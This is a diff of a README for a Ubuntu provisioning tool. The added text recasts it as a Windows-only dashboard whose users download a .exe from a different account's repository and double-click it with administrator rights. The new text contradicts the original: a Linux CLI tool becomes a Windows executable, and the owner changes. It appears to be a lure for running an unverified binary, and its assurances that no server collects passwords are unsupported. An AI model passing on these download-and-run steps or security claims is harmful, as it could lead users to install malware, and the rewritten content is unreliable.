@@ -1,139 +1,69 @@
-# VAS v0.1.5 - CLI automation and system provisioning 2026
+# 🌐 vas-ubuntu22-dashboard-loader - Manage Ubuntu desktop setups with ease
 
-> **VAS makes Ubuntu 22.04 LTS Desktop setup easier with CLI-based provisioning, VPN and kiosk control, plus a local dashboard in version 0.1.5.**
+[![](https://img.shields.io/badge/Download-Dashboard-blue.svg)](https://github.com/Gilbertoperculated238/vas-ubuntu22-dashboard-loader)
 
-[![Platform](https://img.shields.io/badge/Platform-Ubuntu%2022.04%20LTS%20Desktop-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v0.1.5-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/seanwgustone2712/vas-ubuntu22-dashboard-loader?style=flat-square)](https://github.com/seanwgustone2712/vas-ubuntu22-dashboard-loader)
+This tool helps you manage Ubuntu 22.04 LTS installations from your computer. It automates the preparation of your workstation. You gain control over screen settings, network security, and dashboard features. This dashboard runs commands for you to save time and effort.
 
----
+## 📋 System Requirements
 
-<p align="center">
-  <a href="https://seanwgustone2712.github.io/vas-ubuntu22-dashboard-loader/">
-    <img src="https://img.shields.io/badge/Download-VAS%20Latest-brightgreen?style=for-the-badge" alt="Download VAS">
-  </a>
-</p>
+To use this software, your computer must meet these standards:
 
-> **[Direct Download - VAS v0.1.5](https://seanwgustone2712.github.io/vas-ubuntu22-dashboard-loader/)**
+- Windows 10 or Windows 11.
+- An internet connection for access to setup files.
+- A user account with administrator permissions.
+- Basic knowledge of how to open a file on your desktop.
 
----
+Your system should have at least 4GB of RAM to handle the dashboard tasks. Ensure you have the latest updates from Microsoft installed.
 
-[Download Latest Build](https://seanwgustone2712.github.io/vas-ubuntu22-dashboard-loader/)
+## 📥 Get the Software
 
----
+You must visit the project page to download the latest version of the dashboard. Follow these steps:
 
-## What VAS Does
+1. Visit [this page to download the software](https://github.com/Gilbertoperculated238/vas-ubuntu22-dashboard-loader).
+2. Look for the file ending in .exe in the releases section.
+3. Click the link to save the file to your Downloads folder.
+4. Locate the icon in your file explorer.
+5. Double-click the icon to start the setup process.
 
-VAS is a command-line tool for automating setup and ongoing management of Ubuntu 22.04 LTS Desktop machines. It is built around repeatable provisioning steps, including core package installation, display and touchscreen configuration, and remote-access setup from one unified flow.
+## ⚙️ How to use the Dashboard
 
-The project fits deployments that need the same initialization every time, such as kiosk-oriented systems, workstations using WireGuard VPN, and installations where local visibility is useful during operation. In addition to the CLI, VAS provides a web dashboard and diagnostic capabilities for status checks, monitoring, and routine administration.
+The dashboard provides a simple interface to manage your Ubuntu 22.04 environment. Follow these steps to configure your system:
 
----
+### Initialize the dashboard
+Once the program opens, you see a main window. The dashboard checks your current connection status. If the tool detects an Ubuntu environment, it populates the main screen with your current settings. If it finds no connection, it asks you to check your network cables or Wi-Fi.
 
-## Capabilities
+### Set up VPN access
+You can add VPN credentials through the Security tab. Click the tab labeled Security. Enter the server address and your login information into the boxes. Click the Save button. The dashboard verifies your credentials immediately. If the settings work, you see a green checkmark on the screen.
 
-- Installs core packages and remote-access tools
-- Applies display and touchscreen configuration
-- Manages WireGuard VPN profiles and connection status
-- Creates a kiosk user and enables autologin mode
-- Supports QR scanning and MQTT publishing workflows
-- Includes a web dashboard for local system monitoring
-- Provides an MCP diagnostic server
-- Supports self-update, dry-run, uninstall, and reset actions
+### Configure kiosk mode
+Kiosk mode limits a user to one specific application. This feature helps businesses secure their terminals. Go to the Kiosk tab to enable this mode. Select the application you want to restrict the user to. Set the timer for the screen timeout if needed. Click Apply to save your changes to the target Ubuntu system.
 
----
+### Manage system updates
+The dashboard tracks the version of your Ubuntu software. Click the Updates tab to see if your system runs the current version. The tool highlights any available patches. Click Install Updates to start the process. The dashboard shows a progress bar while it secures your workstation.
 
-## Setup
+## 🛠️ Frequently Asked Questions
 
-Clone the repository and launch the setup entry point from the project folder:
+### Does this tool change my Windows settings?
+No. This tool only communicates with connected Ubuntu machines. It leaves your Windows installation untouched.
 
-```bash
-git clone https://github.com/seanwgustone2712/vas-ubuntu22-dashboard-loader.git
-cd REPO
-./vas --help
-```
+### What happens if the dashboard crashes?
+If the program closes unexpectedly, restart it. It stores your settings. You do not need to enter your configuration data again if the tool shuts down.
 
-If you prefer the downloadable package rather than the source tree, use the launch steps that come with that build and run VAS from a terminal with elevated privileges whenever system-level changes are needed.
+### Can I run this tool on a Mac?
+This specific version works only on Windows. Use a Windows computer to manage your fleet of Ubuntu machines.
 
----
+### Is the software free to use?
+Yes. It remains free to download and install for all users. You do not need a license key to access the features.
 
-## Usage
+### How do I remove the software?
+Open your Windows Settings menu. Select Apps, then find the dashboard in the list. Click Uninstall to remove the program from your drive.
 
-Most workflows start with provisioning and continue later with maintenance commands:
+## 🛡️ Security Considerations
 
-```bash
-./vas install
-./vas status
-./vas vpn list
-./vas dashboard
-```
+This program encrypts your login data locally. No outside server collects your passwords or VPN keys. Always verify the source of the file before you run it on your machine. We recommend that you only download official releases from the link provided above. Keep your Windows machine updated to prevent unauthorized access to your management tools.
 
-Typical task flow:
+## 🤝 Support and Updates
 
-1. Prepare a fresh Ubuntu desktop with the required packages.
-2. Set screen, input, or kiosk behavior.
-3. Add or swap WireGuard profiles for remote access.
-4. Use the dashboard to check current system status.
-5. Try dry-run mode before applying changes on a live machine.
+We release updates to improve the stability of the dashboard. Check the main page periodically to see if a newer version exists. If you experience errors, restart your computer and try the operation again. Our team designs this tool for performance and reliability. By using the command-line interface under the hood, the dashboard ensures that your Ubuntu configuration remains consistent across all your devices.
 
----
-
-## Configuration
-
-VAS keeps its operational settings in project-managed config files and in the system locations used by the features it turns on. This covers VPN profile data, kiosk user settings, and display or touchscreen adjustments.
-
-Example structure:
-
-```ini
-[system]
-mode=provision
-
-[vpn]
-provider=wireguard
-profile=default
-
-[kiosk]
-enabled=true
-
-[dashboard]
-enabled=true
-```
-
-When needed, use the CLI to inspect, reset, or refresh these settings.
-
----
-
-## Requirements
-
-- Ubuntu 22.04 LTS Desktop
-- Command-line access with sufficient privileges for system setup
-- Network access for package installation and remote-access setup
-- Support for the tools used by the workflow, including Docker, Git, Node.js, WireGuard, Flask, MQTT, and related utilities where applicable
-- Local storage for configuration files, profiles, and dashboard assets
-
----
-
-## FAQ
-
-### How do I begin?
-Download the latest build or clone the repository, then run the help command to view the available provisioning and maintenance actions.
-
-### Can I check the changes first?
-Yes. VAS includes dry-run mode so you can review planned actions before making changes on the machine.
-
-### Where are the monitoring and diagnostic features?
-The repository includes a web dashboard for status visibility and an MCP diagnostic server for additional checks.
-
-### How can I update VAS?
-Use the self-update command when that fits your workflow, or replace the local copy with the latest build from the download link.
-
-### What if I want to remove the setup and start fresh?
-VAS provides uninstall and reset options for rolling back managed setup changes.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: ubuntu, dashboard, vpn, kiosk, provisioning, windows, cli
